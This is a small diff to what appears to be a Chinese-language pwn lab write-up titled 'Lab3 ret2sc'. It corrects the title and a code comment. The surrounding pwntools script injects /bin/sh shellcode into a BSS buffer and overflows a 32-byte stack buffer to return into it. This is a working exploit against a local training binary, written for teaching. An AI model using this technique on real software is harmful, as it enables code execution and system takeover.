@@ -1,4 +1,4 @@
-# Lab3 ret2s
+# Lab3 ret2sc
 
 ## 先備知識
 
@@ -40,7 +40,7 @@ from pwn import *
 r = process('./ret2sc')
 name = 0x804a060 # address of name (BSS) where we are going to placed return 
 r.recvuntil(":")
-r.sendline(asm(shellcraft.sh())) # /bin/shell shellcode
+r.sendline(asm(shellcraft.sh())) # /bin/shell shellcode which is 24 bytes
 r.recvuntil(":")
 payload = "a"*32 # buffer size 
 payload += p32(name) # overflow return 
